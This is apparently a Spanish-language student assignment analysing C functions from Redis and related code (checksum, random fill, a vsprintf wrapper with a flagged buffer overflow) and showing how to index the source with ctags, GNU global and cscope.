- **Mecanismo de importaci√≥n/exportaci√≥n:** Depende de la compilaci√≥n. Normalmente, en C, esto se resuelve mediante el Enlace (Linking). Si es parte de un ejecutable monol√≠tico, es enlace est√°tico. Si ae.c se compila en una .dll o .so, se usar√≠a enlace din√°mico.


### 9 Ejecuci√≥n y depuraci√≥n
- Usa el runtime est√°ndar de C (para memoria din√°mica, aunque envuelto en zrealloc).
- El fragmento es c√≥digo fuente; si el binario se compila con s√≠mbolos de depuraci√≥n o no depende de las opciones del compilador, aqu√≠ no se ve.

### 10. Estructuras de control
- **Bifurcaci√≥n:**
  - Tres if seguidos con return temprano:
    - Igualdad de tama√±os.
    - Comprobaci√≥n maxfd >= setsize.
    - Resultado de aeApiResize.
- **Repetici√≥n:**
  - Un bucle `for (i = eventLoop->maxfd+1; i < setsize; i++)`: Inicializa las nuevas posiciones de events con AE_NONE.
- **Saltos / flujo:**
  - `return` m√∫ltiple (salidas tempranas en caso de error o no-cambio).
  - No hay break, continue, goto, ni manejo de excepciones (en C est√°ndar no hay try/catch).

### 11. An√°lisis de malware / seguridad
- Desde el punto de vista de malware, esta funci√≥n no muestra comportamiento t√≠pico malicioso.
- Conclusi√≥n en clave malware: Es una funci√≥n de infraestructura interna de un event loop (gesti√≥n de arrays de eventos). Por s√≠ sola no es indicio de comportamiento malicioso.


---------------------------

## Funci√≥n 2
![funcion-2](capturas/funcion-2-ok.png)

```
static int
args_cmp(struct args_entry *a1, struct args_entry *a2)
{
        return (a1->flag - a2->flag);
}
```

### 1. Identificaci√≥n y prop√≥sito
- **Nombre:** args_cmp
- **Contexto:** funci√≥n C, probablemente usada como funci√≥n de comparaci√≥n.
- **Descripci√≥n:** La funci√≥n args_cmp compara dos estructuras del tipo struct args_entry. Resta el valor del campo flag de la segunda estructura (a2) al de la primera (a1).
  - El prop√≥sito de este patr√≥n es servir como funci√≥n de comparaci√≥n, t√≠picamente utilizada por algoritmos de ordenamiento como qsort o de b√∫squeda como bsearch.
  - Si el resultado es < 0: a1 es menor que a2.
  - Si el resultado es 0: Son iguales.
  - Si el resultado es > 0: a1 es mayor que a2.


### 2. Naturaleza de la funci√≥n
- **Clasificaci√≥n:** Es una funci√≥n, ya que su objetivo principal es calcular y devolver un valor (int) sin generar efectos secundarios.
- **Origen:** Funci√≥n de usuario, no forma parte de la biblioteca est√°ndar. Funci√≥n auxiliar / Comparador (Helper function).
- **¬øPredicado?:** No, devuelve un valor de comparaci√≥n, no un booleano puro.
- **¬øFunci√≥n hoja?:** S√≠. No llama a ninguna otra funci√≥n; solo hace una operaci√≥n aritm√©tica.


### 3. Signatura y par√°metros
- **Signatura:** `static int args_cmp(struct args_entry *a1, struct args_entry *a2);`
- **Aridad:** 2 par√°metros ‚Üí funci√≥n binaria.
- **Par√°metros:**
  - `a1`:
    - Tipo: struct args_entry *. Puntero a la primera estructura (LHS - Left Hand Side).
    - Paso: por valor (puntero), se copian las direcciones de memoria, actuando como referencia a los datos. Evita la copia costosa de toda la estructura.
    - No es const.

  - `a2`:
    - Tipo: struct args_entry *. Puntero a la segunda estructura (RHS - Right Hand Side).
    - Paso: por valor (puntero), se copian las direcciones de memoria, actuando como referencia a los datos. Evita la copia costosa de toda la estructura.
    - No es const.

- **No hay `const` en los par√°metros.**
- **Par√°metros por defecto:** No.
- **No es varargs (variadic functions).** Esta funci√≥n no acepta un n√∫mero variable de argumentos.


### 4. Valor de retorno
- **Tipo:** int (Entero con signo).
- **Qu√© devuelve exactamente:** `a1->flag - a2->flag` ‚Üí un entero negativo, cero o positivo seg√∫n la relaci√≥n de orden entre ambos flag.
- **No devuelve objetos** ni c√≥digos complejos, solo el resultado de la comparaci√≥n.



### 5. Comportamiento y Efectos secundarios
- **Lectura:** Lee memoria del heap/stack (flag).
- **Escritura:** Ninguna.
- **Estado Global:** No accede ni modifica nada fuera de sus par√°metros.
- **Conclusi√≥n:** Sin efectos secundarios observables.



### 6. Pureza y Estado
- **¬øEs una funci√≥n pura?:** S√≠.
  - Su valor de retorno depende exclusivamente de sus argumentos.
  - No tiene efectos secundarios (no imprime, no escribe en archivos, no modifica variables globales).

- **Transparencia referencial:** S√≠. Podemos reemplazar la llamada a la funci√≥n por el resultado de la resta (si tuvi√©ramos acceso a los punteros) y el programa funcionar√≠a igual.



### 7. Sistema de tipos y Visibilidad
- **Lenguaje:** C ‚Üí tipado est√°tico.
- **Usa tipos:** int, struct args_entry *.
- **Enlace (Linkage):** Interno.
  - La palabra clave static restringe la visibilidad al archivo fuente actual (Unidad de traducci√≥n).
  - No puede ser invocada directamente desde otros archivos .c (no se exporta el s√≠mbolo).


### 8. Relaciones con otras funciones y librer√≠as
- No llama a otras funciones.
- Exporta: No. La palabra clave static al inicio de la declaraci√≥n restringe la visibilidad de esta funci√≥n √∫nicamente al archivo fuente (.c) actual. No es visible para otros m√≥dulos (Enlace interno).

  
### 9. Ejecuci√≥n y depuraci√≥n
- Usa solo el runtime m√≠nimo de C (operaci√≥n aritm√©tica).
- Mecanismo de carga: Al ser est√°tica, su direcci√≥n se resuelve en tiempo de compilaci√≥n/enlace dentro de su propia unidad de traducci√≥n.


### 10. Estructuras de control
- No hay estructuras de control (if, for, etc.).
- **Es un bloque lineal** simple que ejecuta una instrucci√≥n y retorna.
- Usa return para finalizar.


### 11. An√°lisis de malware / seguridad
Desde la √≥ptica de malware, esta funci√≥n:
- Solo lee un campo de dos estructuras y devuelve una resta.
- No accede a red, disco, procesos, registro, ni memoria din√°mica.
- No hace ofuscaci√≥n, ni anti-debug, ni nada similar.
- Segura en memoria: No realiza aritm√©tica de punteros peligrosa ni escribe en memoria.

---------------------------

## Funci√≥n 3
![funcion-3](capturas/funcion-3.png)

```
uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    return ~sum;
}
```


### 1. Identificaci√≥n y prop√≥sito
- **Nombre:** checksum_generic
- **Contexto:** Algoritmo de verificaci√≥n de integridad (Checksum).
- **¬øQu√© hace?:** Implementa el c√°lculo del Checksum de Internet (RFC 1071), est√°ndar en protocolos como IP, TCP y UDP. Recorre un bloque de memoria apuntado por addr, suma palabras de 16 bits en una variable de mayor tama√±o (unsigned long), maneja el posible byte sobrante y finalmente pliega la suma a 16 bits y le hace el complemento a uno. Devuelve ese checksum de 16 bits.

### 2. Naturaleza de la funci√≥n
- **Clasificaci√≥n:** Es funci√≥n, devuelve un valor num√©rico expl√≠cito (`uint16_t`).
- **Origen:** Funci√≥n de usuario.
- **¬øPredicado?:** No; devuelve un valor num√©rico de checksum, no un booleano.
- **¬øFunci√≥n hoja?:** S√≠. No realiza llamadas a otras funciones.


### 3. Signatura y par√°metros
- **Signatura:** `uint16_t checksum_generic(uint16_t *addr, uint32_t count);`
- **Aridad:** 2 par√°metros ‚Üí funci√≥n binaria.
- **Par√°metros:**
  - `addr`:
    - Tipo: uint16_t *. Puntero a enteros sin signo de 16 bits (el buffer de datos).
    - Paso: Se pasa por valor (la direcci√≥n de memoria), actuando como referencia al buffer.
    - No est√° declarado como const, aunque no se modifica la memoria apuntada.

  - `count`:
    - Tipo: uint32_t. Entero sin signo de 32 bits (la cantidad de bytes a procesar).
    - Paso: por valor.
    - Se utiliza como contador de longitud: en el bucle for se va decrementando (count -= 2); esta modificaci√≥n solo afecta al valor local dentro de la funci√≥n.

- **Par√°metros constantes:** No. Ninguno est√° declarado const, aunque sem√°nticamente se usan como entrada solo.
- **Par√°metros por defecto:** No tiene.
- **Varargs:** No hay par√°metros Variables.



### 4. Valor de retorno
- **Tipo devuelto:** `uint16_t`. Entero sin signo de 16 bits.
- **Devuelve:** El valor del checksum calculado.
- **¬øDevuelve un objeto creado dentro de ella?:** No, devuelve un valor primitivo.



### 5. Comportamiento y Efectos secundarios
- **Efectos Secundarios:** Ninguno.
- **Lectura de Memoria:** Solo lee el rango especificado por addr.
- **Mutaci√≥n:** Solo muta sus propias variables locales (sum, copias locales de addr y count).
- **Conclusi√≥n: no tiene efectos secundarios observables.**


### 6. Pureza y Estado
- **¬øEs pura?:** S√≠. No modifica estado global ni par√°metros. Solo lee la memoria a la que apuntan sus par√°metros. Si el contenido de la memoria no cambia, siempre devuelve lo mismo ‚Üí se puede considerar funci√≥n pura (a efectos pr√°cticos de an√°lisis de c√≥digo).
- Transparencia referencial: S√≠.


### 7. Sistema de tipos y visibilidad
- **Lenguaje:** C ‚Üí tipado est√°tico.
- **Tipos Clave:** uint16_t (datos), uint32_t (contador), unsigned long (acumulador).  
- **Enlace (Linkage):** Enlace est√°tico o din√°mico dependiendo de c√≥mo se compile el archivo objet


### 8. Relaciones con otras funciones y librer√≠as
- No llama a ninguna otra funci√≥n.
- **Exporta:** S√≠.
 

### 9. Ejecuci√≥n y depuraci√≥n
- Usa solo el runtime b√°sico de C (operaciones aritm√©ticas y de desplazamiento).
- Si el binario se compila con s√≠mbolos de depuraci√≥n, aparecer√° con el nombre checksum_generic, pero esto depende de las opciones de compilaci√≥n, no del c√≥digo fuente.


### 10. Estructuras de control
- **Bifurcaci√≥n:**
  - Un if (count == 1) para tratar el caso en que queda un byte sobrante.

- **Repetici√≥n:**
  - Bucle for (sum = 0; count > 1; count -= 2)
    Lee de dos en dos bytes (una palabra de 16 bits) mientras queden al menos 2 bytes.

- **Saltos / flujo:**
  - Solo un return al final (return ~sum;).
  - No hay break, continue, goto, ni excepciones (en C no hay try/catch).

### 11. An√°lisis de malware / seguridad
- Este tipo de funci√≥n puede aparecer tanto en software leg√≠timo (protocolos de red, verificaci√≥n de integridad) como en malware (para validar payloads, comprobar integridad de c√≥digo, etc.).
- Por s√≠ sola no es indicador de comportamiento malicioso.
- Conclusi√≥n en clave malware: Es una rutina de checksum gen√©rica, muy neutra; el posible uso malicioso depender√≠a de qu√© datos se le pasan y desde d√≥nde se llama, no de la funci√≥n en s√≠.


---------------------------


## Funci√≥n 4
![funcion-4](capturas/funcion-4.png)

```
void rand_str(char *str, int len) // Generate random buffer (not alphanumeric!) of length len
{
    while (len > 0)
    {
        if (len >= 4)
        {
            *((uint32_t *)str) = rand_next();
            str += sizeof (uint32_t);
            len -= sizeof (uint32_t);
        }
        else if (len >= 2)
        {
            *((uint16_t *)str) = rand_next() & 0xFFFF;
            str += sizeof (uint16_t);
            len -= sizeof (uint16_t);
        }
        else
        {
            *str++ = rand_next() & 0xFF;
            len--;
        }
    }
}
```


### 1. Identificaci√≥n y prop√≥sito
- **Nombre:** rand_str.
- **Contexto:** Rutina de llenado de memoria con datos pseudo-aleatorios (Memory Fill / Random Generator).
- **Descripci√≥n:** Rellena un b√∫fer apuntado por str con len bytes de datos aleatorios.
  - Estrategia de Optimizaci√≥n: En lugar de escribir byte a byte (lento), intenta escribir bloques de palabra de 32 bits (4 bytes) y media palabra (2 bytes) para reducir el n√∫mero de accesos a memoria.
- **Nota Importante:** El comentario "not alphanumeric!" confirma que genera datos binarios crudos, no texto legible. Los bytes pueden tener cualquier valor entre 0x00 y 0xFF.


### 2. Naturaleza de la funci√≥n
- **Clasificaci√≥n:** Es un procedimiento (retorna void).
- **Origen:** C√≥digo de usuario (User-defined).
- **Nivel:** Bajo nivel (manipulaci√≥n directa de punteros y memoria).
- **¬øPredicado?:** No. Retorna void. Un predicado suele devolver un booleano (verdadero/falso) evaluando una condici√≥n l√≥gica.
- **¬øFunci√≥n Hoja?:** No. Depende de rand_next(). No es una hoja (leaf function) en el √°rbol de llamadas.





### 3. Signatura y par√°metros
- **Signatura:** `void rand_str(char *str, int len);`
- **Aridad:** 2 par√°metros ‚Üí funci√≥n binaria.
- **Par√°metros:**
  - `str` (Entrada/Salida): char *.
    - Puntero al inicio del bloque de memoria a llenar. Paso por valor.
    - No es const: expl√≠citamente se usa para escritura.
    - Riesgo de Alineaci√≥n: Al hacer cast a (uint32_t *), si la direcci√≥n de str no es m√∫ltiplo de 4, podr√≠a provocar un fallo de segmentaci√≥n (Bus Error) en arquitecturas estrictas (como SPARC o ARM antiguos), aunque x86 lo tolera con penalizaci√≥n de rendimiento.
  - `len` (Entrada): int.
    - Entero que indica la longitud (cantidad de bytes) a escribir. Paso por valor.
    - Se usa como contador de bytes restantes; se va decrementando en el while.
    - Longitud en bytes. Se modifica localmente (decrementa) para controlar el bucle.

- **Par√°metros `const`:** No.
- **Valores por defecto:** No.
- **No es varargs.** No acepta un n√∫mero variable de argumentos.




### 4. Valor de retorno
- **Tipo devuelto:** void.
- **Qu√© ‚Äúdevuelve‚Äù en la pr√°ctica:** No hay valor de retorno; el ‚Äúresultado‚Äù es el contenido del b√∫fer str, que queda rellenado con valores pseudo-aleatorios.
- **Resultado:** La funci√≥n opera exclusivamente mediante efectos secundarios (mutaci√≥n del b√∫fer).




### 5. Comportamiento y Efectos secundarios
- **Muta o lee valores fuera de su √°mbito:** Muta valores en el heap o stack (el b√∫fer str) que pertenece al √°mbito del llamador ‚áí Tiene efectos secundarios claros, no es pura.
- **Mutaci√≥n de Memoria:** Escribe directamente en el heap o stack del llamador.
- **Llamadas:** Invoca repetidamente a rand_next() para obtener entrop√≠a.
- **Estado Global:** Modifica impl√≠citamente el estado del generador de n√∫meros aleatorios (la "semilla" interna de rand_next).





### 6. Pureza y Estado
- **¬øEs pura?:** No.
  - Depende de un generador externo (rand_next).
  - Muta la memoria externa (str).
  - No es determinista.
- **Transparencia Referencial:** No.


### 7. Sistema de tipos y Visibilidad
- **Lenguaje:** C (Tipado est√°tico pero con punteros "d√©biles").
- **Casting (Type Punning):** La funci√≥n realiza conversiones de tipo expl√≠citas y arriesgadas: convierte un puntero char* a uint32_t* y uint16_t*.
  - Esto indica que el compilador debe tratar la misma direcci√≥n de memoria como diferentes tipos de datos para optimizar la escritura.
- **Enlace (Linkage):** Externo.
  - Al no tener la keyword static, la funci√≥n es exportada y visible para cualquier otro archivo del proyecto que la enlace.



### 8. Relaciones con otras funciones y librer√≠as
- Llama a: `rand_next()`: generador de n√∫meros pseudo-aleatorios (probablemente implementado en el mismo proyecto o en una librer√≠a).
- No se ven otras dependencias directas (no hace llamadas de sistema, ni I/O, etc.).


### 9. Ejecuci√≥n y depuraci√≥n
- Requiere el runtime del generador de PRNG (rand_next()), pero por lo dem√°s solo operaciones aritm√©ticas / de punteros.
- No hay informaci√≥n en el c√≥digo fuente sobre s√≠mbolos de depuraci√≥n; eso depende de c√≥mo se compile.


### 10. Estructuras de control
- **Repetici√≥n:** Un bucle while (len > 0) que va consumiendo longitud.

- **Bifurcaci√≥n:**
  - Dentro del while, un if / else if / else:
    - len >= 4 ‚Üí escribe 4 bytes de golpe (cast a uint32_t *).
    - len >= 2 ‚Üí escribe 2 bytes (uint16_t *).
    - Si no, escribe 1 byte.

- **Saltos / flujo:**
  - No hay break, continue, goto.
  - El bucle termina cuando len llega a 0.


### 11. An√°lisis de malware / seguridad
- **Riesgo T√©cnico (Crash):** Problema de alineaci√≥n de punteros.


---------------------------

## Funci√≥n 5
![funcion-5](capturas/funcion-5.png)

``` 
static const char *TextFormat(const char *text, ...)
{
    #define MAX_FORMATTEXT_LENGTH   64

    static char buffer[MAX_FORMATTEXT_LENGTH];

    va_list args;
    va_start(args, text);
    vsprintf(buffer, text, args);
    va_end(args);

    return buffer;
}
```

### 1. Identificaci√≥n y Prop√≥sito
- **Nombre:** TextFormat
- **Contexto:** Funci√≥n envoltorio (wrapper) para formateo de cadenas en C.
- **Descripci√≥n:** Utilidad para formatear texto con argumentos variables (similar a printf) y devolverlo como una cadena utilizable.
  - Toma una cadena de formato (text) y argumentos variables (...).
  - Procesa los argumentos usando vsprintf.
  - Almacena el resultado en un b√∫fer est√°tico interno (buffer).
  - Devuelve un puntero a dicho b√∫fer.
- **Nota Cr√≠tica:** Debido al uso de un static char buffer, el contenido devuelto es vol√°til: se sobrescribir√° en la siguiente llamada a la funci√≥n. No es persistente m√°s all√° de la siguiente invocaci√≥n.

### 2. Naturaleza de la funci√≥n
- **Clasificaci√≥n:** Es una funci√≥n (devuelve un valor expl√≠cito const char *).
- **Origen:** Funci√≥n de usuario (User-defined function).
- **¬øEs Predicado?:** No. Devuelve un puntero a caracteres constantes. Un predicado suele devolver un booleano (verdadero/falso) evaluando una condici√≥n l√≥gica.
- **¬øEs Funci√≥n Hoja?: No.** Realiza llamadas a la biblioteca est√°ndar (va_start, vsprintf, va_end).
- **¬øPar√°metros Variables?:** S√≠. Es una funci√≥n vari√°dica (variadic function). En la deficini√≥n de la funci√≥n usa `...` que indica ü†Æ Despu√©s de los par√°metros fijos, la funci√≥n puede recibir un n√∫mero variable de argumentos.


### 3. Signatura y par√°metros
- **Signatura:** `static const char *TextFormat(const char *text, ...);`
- **Aridad:** funci√≥n de aridad variable (varargs):
  - Al menos 1 par√°metro fijo (text).
  - Luego ... (lista de argumentos variables).
- **Par√°metros por defecto:** No.

- **Par√°metros:**
  - `text` (Fijo): const char *. Cadena de formato. Pasado por valor (el puntero), de solo lectura.
  - `...` (Variables): Lista de argumentos gestionada mediante macros de stdarg.h. Se pasan a trav√©s de la pila (stack).

### 4. Valor de retorno
- **Tipo:** const char * (Puntero a caracteres constantes).
- **Valor:** La direcci√≥n de memoria del arreglo est√°tico buffer.
- **Sem√°ntica:** Devuelve una referencia a una zona de memoria compartida y mutable internamente.


### 5. Comportamiento y Efectos (Side Effects)
- **Modificaci√≥n de Estado:** S√≠. Modifica la variable est√°tica buffer.
  - Aunque `buffer` est√° declarada dentro de la funci√≥n, su almacenamiento es est√°tico (vive durante toda la ejecuci√≥n del programa) y mantiene su valor entre llamadas hasta que es sobrescrito.
- **Modificaci√≥n de Globales:** T√©cnicamente modifica una variable con almacenamiento est√°tico, que act√∫a funcionalmente como una variable global privada (con visibilidad restringida al √°mbito de la funci√≥n).
- **Llamadas:** Invoca a vsprintf (con efectos secundarios de escritura en memoria).


### 6. Pureza y Estado
- **¬øFunci√≥n Pura?:** No.
  - Depende de estado mutable (buffer).
  - No tiene transparencia referencial.

- **Seguridad de Hilos (Thread-Safety):** No.
  - No es reentrante. Si dos hilos llaman a TextFormat simult√°neamente, se producir√° una condici√≥n de carrera (race condition) corrompiendo el contenido del buffer.


### 7. Sistema de Tipos y Visibilidad
- **Sistema de Tipos:** Est√°tico (C).
- **√Åmbito (Scope):** De archivo / M√≥dulo.
- **Enlace (Linkage):** Interno.
  - La palabra clave static en la declaraci√≥n de la funci√≥n (static const char *...) impide que esta funci√≥n sea visible o enlazada desde otros archivos objeto (.o). Es privada para este m√≥dulo.


### 8. Relaciones con otras funciones y librer√≠as
- Llama a:
  - va_start, va_end (macros/funciones de <stdarg.h>).
  - vsprintf (funci√≥n de la libc para formatear en un buffer con va_list).


### 9. Ejecuci√≥n y depuraci√≥n
- Usa el runtime est√°ndar de C (libc).
- Depuraci√≥n normal; al ser static, su s√≠mbolo es interno al m√≥dulo.

### 10. Estructuras de control
- No tiene bucles ni condicionales.
- **Flujo lineal:**
  - Preparar va_list.
  - Llamar a vsprintf.
  - Cerrar va_list.
  - return buffer;.

### 11. An√°lisis de malware / seguridad
- **<mark>Vulnerabilidad Cr√≠tica (Buffer Overflow):<mark>**
  - Uso de vsprintf (en lugar de vsnprintf) en un b√∫fer de tama√±o fijo muy peque√±o (`MAX_FORMATTEXT_LENGTH = 64 bytes`) ‚Üí riesgo de desbordamiento de buffer si el resultado supera MAX_FORMATTEXT_LENGTH.
  - Si el texto formateado excede los 63 caracteres (+ terminador nulo), vsprintf escribir√° fuera de los l√≠mites del arreglo buffer, corrompiendo la memoria adyacente (stack o secci√≥n de datos est√°ticos, dependiendo del compilador).


---------------------------

# Ejercicio 3 - An√°lisis de variables

Una funci√≥n representa un punto de entrada, posiblemente con par√°metros, que puede necesitar acceder a variables globales, que puede manipular ciertas variables y que, finalmente, retorna o no un resultado. En m√°s, puede retornar no solo en un punto sino en varios, dado que tambi√©n puede tomar decisiones mediante las estructuras de control que hemos estudiado.

Tenemos el c√≥digo de una funci√≥n y vamos a analizarla. Necesitamos se√±alar:
- Donde y que variables crea y necesita; cual es su √°mbito.
- Donde modifica (escribe) los par√°metros.
- Donde lee o modifica valores globales (fuera de la funci√≥n o sus par√°metros)
- Que estructuras de control posee. Debemos identificar los bucles (while, for, ‚Ä¶), estructuras
selectivas (if, switch, ‚Ä¶).
- Que puntos de salida posee y con que valor lo hacen.

```c
void sentinelPropagateDownAfterPeriod(sentinelRedisInstance *master) {
    dictIterator *di;
    dictEntry *de;
    int j;
    dict *d[] = {master->slaves, master->sentinels, NULL};
 
    for (j = 0; d[j]; j++) {
        di = dictGetIterator(d[j]);
        while((de = dictNext(di)) != NULL) {
            sentinelRedisInstance *ri = dictGetVal(de);
            ri->down_after_period = master->down_after_period;
        }
        dictReleaseIterator(di);
    }
}
```

## 1. Par√°metros y retorno
- La funci√≥n se llama sentinelPropagateDownAfterPeriod.
- Retorno: void ‚Üí no devuelve ning√∫n valor.
- Par√°metro √∫nico (1): Toma un solo par√°metro de tipo puntero a `sentinelRedisInstance` llamado `master`. Este par√°metro se usa para leer valores iniciales y para propagar su configuraci√≥n a otros objetos.


## 2. Variables locales que crea y necesita; √°mbito de esas variables.
Dentro de la funci√≥n se crean variables locales (su √°mbito es todo el cuerpo de la funci√≥n, salvo donde se indique):
- (2) `dictIterator *di;` Puntero a un iterador de diccionario. Se usa para recorrer los diccionarios de esclavos y sentinels.
- (3) `dictEntry *de;` Puntero a una entrada de diccionario, usada en el while.
- (4) `int j;` Entero usado como √≠ndice en el bucle for sobre el array d.
- (5) `dict *d[] = {master->slaves, master->sentinels, NULL};` Array local de punteros a `dict`.
  - `d[0]` apunta al diccionario de esclavos (master->slaves).
  - `d[1]` apunta al diccionario de sentinels (master->sentinels).
  - `d[2]` es NULL y act√∫a como marcador de final para el bucle for.

Dentro del bucle while se crea otra variable local, cuyo √°mbito se limita al cuerpo del while:
- (6) `sentinelRedisInstance *ri = dictGetVal(de);` Puntero a sentinelRedisInstance, representa cada esclavo o sentinel extra√≠do del diccionario actual.


## 3. Uso y modificaci√≥n de par√°metros
- El par√°metro master no se modifica (no se le asigna un nuevo valor ni se cambia su direcci√≥n).
- S√≠ se leen varios campos de master:
  - En la inicializaci√≥n del array d (l√≠nea 5):
    - `master->slaves`
    - `master->sentinels`

  - En el interior del while (l√≠nea 11):
    - `master->down_after_period` se usa como fuente del valor que se va a propagar.

Por tanto:
- master se usa como origen de informaci√≥n, nunca como destino de escritura directa.

## 4. Lectura - Escritura de valores globales
Aunque no vemos variables globales expl√≠citas, s√≠ se modifican estructuras que no son locales a la funci√≥n:
- En la l√≠nea 11:
  - `ri->down_after_period = master->down_after_period;`
  - Se lee master->down_after_period (dato asociado al maestro).
  - Se escribe en ri->down_after_period. `ri` apunta a instancias obtenidas de los diccionarios master->slaves y master->sentinels, por lo que la funci√≥n est√° modificando el campo down_after_period de todas esas instancias (esclavos y sentinels) accesibles a trav√©s del par√°metro master.

Es decir, la funci√≥n propaga el valor down_after_period del maestro al resto de instancias relacionadas.

- Modificaci√≥n de memoria (Efecto lateral):
  - En la l√≠nea 10, modifica el objeto apuntado por ri.
  -     Escribe en ri->down_after_period el valor le√≠do del par√°metro master->down_after_period. Aqu√≠ es donde ocurre la "propagaci√≥n" del valor.

## 5. Estructuras de control
- **Bucle for (l√≠neas 7‚Äì14):**
  ```c
  for (j = 0; d[j]; j++) {
    ...
  }
  ```
  - Inicializaci√≥n: j = 0.
  - Condici√≥n: d[j] ‚Üí el bucle contin√∫a mientras el elemento actual del array d no sea NULL.
  - Actualizaci√≥n: j++ en cada iteraci√≥n.
  - Efecto: recorre los dos diccionarios (slaves y sentinels) definidos en el array d. El NULL final act√∫a de condici√≥n de parada.

- **Bucle while (l√≠neas 9‚Äì12):**
  ```c
  while((de = dictNext(di)) != NULL) {
    ...
  }
  ```
  - Condici√≥n: el resultado de dictNext(di) se asigna a de y se compara con NULL.
  - La iteraci√≥n contin√∫a mientras dictNext devuelva una entrada v√°lida de diccionario (de != NULL).
  - Efecto: recorre todas las entradas del diccionario actual d[j].
 
- **No hay estructuras selectivas** tipo if, switch en este fragmento.


## 6. Llamadas a funciones externas
- `dictGetIterator(d[j])` (l√≠nea 8)
  - Usa el diccionario actual `(d[j])` y devuelve un iterador que se guarda en di.

- `dictNext(di)` (l√≠nea 9)
  - Avanza el iterador `di` y devuelve la siguiente entrada `(dictEntry *)` o `NULL` al terminar.

- `dictGetVal(de)` (l√≠nea 10)
  - Obtiene el valor asociado a la entrada de diccionario de. Ese valor se interpreta como `sentinelRedisInstance *`.

- `dictReleaseIterator(di)` (l√≠nea 13)
  - Libera los recursos asociados al iterador `di` al terminar de recorrer el diccionario.

Estas funciones operan sobre estructuras que viven fuera de la funci√≥n y representan el estado del programa (diccionarios de instancias).


## 7. Puntos de salida de la funci√≥n
- La funci√≥n no contiene `return` expl√≠citos.
- Solo tiene un √∫nico punto de salida impl√≠cito:
  - Al llegar a la llave de cierre } (l√≠nea 15), finaliza la ejecuci√≥n.
  - No se devuelve ning√∫n valor (tipo void).

## 8. En resumen
- (1) Argumento tipo puntero a `sentinelRedisInstance` llamado master.
- (2, 3, 4) Variables locales:
  - `dictIterator *di`
  - `dictEntry *de`
  - `int j`
- (5) Variable local compuesta: `array dict *d[]` inicializado con:
  - `master->slaves`
  - `master->sentinels`
  - `NULL` como terminador
- (6) Dentro del while, variable local `sentinelRedisInstance *ri`.
- (7) Estructura de repetici√≥n for que recorre los elementos del `array d` hasta `NULL`.
- (8) Dentro del for, se crea un iterador de diccionario con dictGetIterator.
- (9) Estructura de repetici√≥n while que recorre todas las entradas de cada diccionario.
- (10) En cada iteraci√≥n del while, se obtiene `ri` con `dictGetVal(de)` y se propaga:
  - `ri->down_after_period = master->down_after_period;`
- (11) Al salir del while, se libera el iterador con `dictReleaseIterator(di)`.
- (12) La funci√≥n termina al final del bloque `(})`, sin valor de retorno `(void)`.


----------------------

# Ejercicio 4 - Bases de datos simb√≥licas


## 1. Pasos para crear una base de datos simb√≥lica en las herramientas elegidas

### ctags
```sh
sudo apt install exuberant-ctags
ctags -R --languages=C --exclude=.git --exclude=deps .
```
donde:
- -R ‚Üí recorre subdirectorios.
- --languages=C ‚Üí solo c√≥digo C (Redis es C).
- --exclude=... ‚Üí no indexar .git ni deps (c√≥digo de terceros).
- . ‚Üí directorio actual.

Crea un archivo tags con todas las funciones, variables, etc.
![tags](capturas/tags-2.png)


### global
```
sudo apt install global
gtags
```
donde:
- Recorre los .c, .h, etc.
- Genera 3 archivos: GTAGS, GRTAGS, GPATH.
![gtags.png](capturas/gtags.png)


Ver todas las referencias (usos) de una funci√≥n main:
```
global -rx main
```
![global-main.png](capturas/global-main.png)
donde:
- -r ‚Üí significa ‚Äúreferences‚Äù. Buscar√° todas las referencias/usos de main en el c√≥digo (llamadas, apariciones, etc.), usando la base GRTAGS.
- -x ‚Üí hace que la salida se muestre en formato ‚Äúcross-reference‚Äù.


### cscope

Instalamos cscope y generamos un fichero con todos los .c y .h del proyecto:
```
sudo apt install cscope
find . -name '*.[ch]' > cscope.files
```

Vemos el fichero scope.files:
![head.scope-files.png](capturas/head.scope-files.png)


Construimos la base de datos
```
cscope -b -q -k -i cscope.files
```
donde:
- -b ‚Üí solo construye la base de datos, no abre la interfaz.
- -q ‚Üí √≠ndice r√°pido (a√±ade cscope.in.out y cscope.po.out).
- -k ‚Üí ignora cabeceras del sistema (no mira /usr/include).
- -i cscope.files ‚Üí usa la lista de archivos que acabamos de generar.
![cscope.png](capturas/cscope-2.png)




Entramos en el men√∫ interactivo y mostramos d√≥nde se usa un s√≠mbolo `main`:
```
cscope -d
```
donde:
- -d ‚Üí usa la base existente, no la reconstruye.
![cscope-main.png](capturas/cscope-main.png)



## 2. Busqueda de todas las funciones ‚Äúmain‚Äù que existen
Como sabr√°s, son las funciones principales de entrada a los distintos ejecutables que existen. Haz una captura o copia la lista resultante.

### Global
Buscamos todas las definiciones de main y las guardamos en un fichero de texto:
```
global -x main > lista_main.txt
```

Resultado:
```
main               43 deps/hiredis/examples/example-ae.c int main (int argc, char **argv) {
main               48 deps/hiredis/examples/example-glib.c main (gint argc     G_GNUC_UNUSED,
main               35 deps/hiredis/examples/example-ivykis.c int main (int argc, char **argv) {
main               35 deps/hiredis/examples/example-libev.c int main (int argc, char **argv) {
main               36 deps/hiredis/examples/example-libevent-ssl.c int main (int argc, char **argv) {
main               40 deps/hiredis/examples/example-libevent.c int main (int argc, char **argv) {
main               47 deps/hiredis/examples/example-libhv.c int main (int argc, char **argv) {
main               50 deps/hiredis/examples/example-libsdevent.c int main (int argc, char **argv) {
main               50 deps/hiredis/examples/example-libuv.c int main (int argc, char **argv) {
main               38 deps/hiredis/examples/example-macosx.c int main (int argc, char **argv) {
main               42 deps/hiredis/examples/example-poll.c int main (int argc, char **argv) {
main              106 deps/hiredis/examples/example-push.c int main(int argc, char **argv) {
main               36 deps/hiredis/examples/example-qt.cpp int main (int argc, char **argv) {
main               12 deps/hiredis/examples/example-ssl.c int main(int argc, char **argv) {
main               58 deps/hiredis/examples/example.c int main(int argc, char **argv) {
main             1289 deps/hiredis/sds.c int main(void) {
main             2266 deps/hiredis/test.c int main(int argc, char **argv) {
main                8 deps/jemalloc/msvc/test_threads/test_threads_main.cpp int main(int argc, char** argv) {
main               47 deps/jemalloc/test/analyze/prof_bias.c main(void) {
main              272 deps/jemalloc/test/analyze/rand.c main(void) {
main               32 deps/jemalloc/test/analyze/sizes.c main() {
main               63 deps/jemalloc/test/integration/MALLOCX_ARENA.c main(void) {
main              151 deps/jemalloc/test/integration/aligned_alloc.c main(void) {
